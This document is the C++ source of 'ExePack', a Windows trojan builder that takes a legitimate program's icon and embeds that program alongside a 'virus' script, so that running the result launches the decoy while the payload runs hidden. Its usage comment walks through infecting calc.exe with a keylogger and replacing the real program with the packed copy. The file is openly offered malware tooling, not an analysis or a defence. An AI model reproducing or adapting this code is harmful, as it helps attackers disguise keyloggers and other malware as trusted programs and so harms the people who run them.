#include "copyIcon.h"
#include "RCData.h"
#include "utils.h"

/*

Usage: ExePack.exe pack <pretend.exe> <virus.pyw> <target.exe>

*** <target.exe> MUST be copy of ExePack.exe ***

Example (infecting calc.exe, Windows Calculator app):

1. Copy ExePack.exe -- the copy is the <target.exe> parameter.
2. Run command: ExePack.exe pack calc.exe keylogger.pyw ExePackCopy.exe
3. Delete calc.exe and replace it with ExePackCopy.exe (which can now be re-named to calc.exe)

*/


// To toggle console for printing (https://stackoverflow.com/a/56834698/6069017):
// Properties -> Linker -> System -> SubSystem to "Windows (/SUBSYSTEM:WINDOWS)" or "Console (/SUBSYSTEM:CONSOLE)"

// Embedding runtime dll dependencies in exe (https://stackoverflow.com/a/32999084/6069017):
// Properties - > C/C++ -> Code Generation -> Runtime Library to /MT

int main() {
	return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOWNORMAL);
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	/* get argc, argv when using WinMain */
	// Snippet from: https://stackoverflow.com/a/57941046/6069017
	int argc;
	LPWSTR *szArglist = CommandLineToArgvW(GetCommandLineW(), &argc);
	char **argv = new char*[argc];
	for (int i = 0; i<argc; i++) {
		int lgth = wcslen(szArglist[i]);
		argv[i] = new char[lgth + 1];
		for (int j = 0; j <= lgth; j++)
			argv[i][j] = char(szArglist[i][j]);
	}
	LocalFree(szArglist);
	/* get argc, argv */

	if (argc == 5 && strcmp(argv[1], "pack") == 0) {
		char* pretend = argv[2];
		char* virus = argv[3];
		char* target = argv[4];

		ReplaceIcon(pretend, target);
		PutFileInRCData(pretend, target, 888);
		PutFileInRCData(virus, target, 999);

		return 0;
	}

	RunFileInRCData(argv[0], 888, FALSE);
	RunFileInRCData(argv[0], 999, TRUE);

	LocalFree(szArglist);
	
	return 0;
}